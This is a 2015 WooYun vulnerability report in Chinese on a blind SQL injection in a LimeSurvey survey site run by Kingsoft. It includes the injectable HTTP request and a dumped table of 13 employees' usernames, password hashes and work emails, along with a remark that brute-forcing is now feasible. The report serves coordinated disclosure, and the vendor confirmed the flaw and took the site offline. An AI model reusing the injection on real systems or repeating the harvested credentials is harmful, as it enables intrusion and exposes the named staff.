wybug_detail:
漏洞详情 披露状态：   									2015-06-05：	细节已通知厂商并且等待厂商处理中									2015-06-05：	厂商已经确认，细节仅向厂商公开									2015-06-15：	细节向核心白帽子及相关领域专家公开									2015-06-25：	细节向普通白帽子公开									2015-07-05：	细节向实习白帽子公开									2015-07-20：	细节向公众公开  简要描述： 金山逍遥某站点MySQL盲注 详细说明：  开源的问券调查系统LimeSurvey，老版本以前发现过上传和注射漏洞。注射点：
POST /index.php/admin/authentication/forgotpassword HTTP/1.1Content-Length: 177Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://survey.xoyo.comCookie: PHPSESSID=6913f244e676097d6328f8a43c5ef97cHost: survey.xoyo.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*action=forgotpass&checksessionbypost=&user=*
MySQL time blind.   漏洞证明：  
current user:    'xoyo@10.19.1.%'current database:    'ke_survey'
知道表名是lime_开头的。 因为是时间盲注，我就没去逐个猜表了。直接下个程序看看admin表在哪里：
http://download.limesurvey.org/latest-stable-release/limesurvey205plus-build150520.zip


获取到用户13个：
Database: ke_survey+------------+---------+| Table      | Entries |+------------+---------+| lime_users | 13      |+------------+---------+

Table: lime_users[13 entries]+---------------+------------------------------------------------------------------+----------------------------+| users_name    | password   | email                      |+---------------+------------------------------------------------------------------+----------------------------+| admin         | 91c2d3714c5671614870aaeaa0629bc68d531cb159da752f4b85b418b43be48f | changguofeng@kingsoft.com  || changguofeng  | 6be3148756bc2ff7eea2c09528c8bc5e734a7b44304bfa2db6ab1f905e59f970 | changguofeng@kingsoft.com  || chenwenting   | 8915bc0cddda4b87152d2e9176d4404ebeb79d6a69525cea57bc516ecc83ecbc | chenwenting@kingsoft.com   || fangjieying   | 7f2e1b39c55ec4a6ec0de44081cd6304db8f5cd09d124a53c00b7fd37b53afd9 | fangjieying@kingsoft.com   || ganlu         | 6d87522f8659a8ceadb31986d199b338055b7d247b49dd09fb964d06e280fd4c | ganlu@kingsoft.com         || liujunli      | fb71ba10ebd3a565241e7549449f94c25403a99782d935a7e3fc179f168e575c | liujunli@kingsoft.com      || sunjuanjuan   | 0faf36e7c04d4dd207d728aee3fca3fb2620594bf90eb9fb5e42cd401acf0e1c | sunjuanjuan@kingsoft.com   || SuWeitian     | 44ce86e8d4f2f8dc39f4290834d7bd1dbbcb51a2da158024bcd362f074ff891b | SuWeitian@kingsoft.com     || wangtengfei   | d88cbcc684727710979948d5bcb0b3350db0a4c4d73d673c1009876dae749fe6 | wangtengfei@kingsoft.com   || zhangbingdong | 95c27b074169a37d8fa15b631effa2580dd628b6c02adb7400f5bc3c79fde8c5 | zhangbingdong@kingsoft.com || zhangtianhui  | 3a61fb1d1a36f0912812c812fe1c6797339067d8ed41673d4beecb4ed2ecdc02 | zhangtianhui@kingsoft.com  || zhangyashu    | 7d3ca7f93dd1a0257f20406b3abbc3c70de206ed9a9cabaefc7ee85769b09254 | zhangyashu@kingsoft.com    || zhuyanling    | 44fdda6528867440cd9ef4d5de6cb089b989399ab74eef64dc68082a20169987 | zhuyanling@kingsoft.com    |+---------------+------------------------------------------------------------------+----------------------------+
没有进一步去尝试解开密码，不是直接md5。 但是有了用户名，这里可以尝试暴力破解了已经。   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-05 10:54 厂商回复： 收到，非常感谢！ 最新状态： 2015-06-17：活动业务已下线
